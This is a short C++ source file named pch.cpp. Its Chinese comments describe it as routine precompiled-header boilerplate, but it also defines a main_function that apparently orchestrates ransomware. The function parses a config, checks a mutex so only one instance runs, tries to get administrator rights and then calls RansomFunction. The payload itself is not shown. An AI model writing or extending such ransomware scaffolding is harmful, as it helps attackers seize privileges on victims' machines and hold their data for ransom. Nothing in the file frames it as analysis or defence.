// pch.cpp: 与预编译标头对应的源文件

#include "pch.h"
#include"BranchFunction.h"
// 当使用预编译的头时，需要使用此源文件，编译才能成功。
void main_function() {
	JsonParse();
	if (!CallCreateMutex())
		ExitProcess(1);
	RunAsAdmin();
	RansomFunction();
}

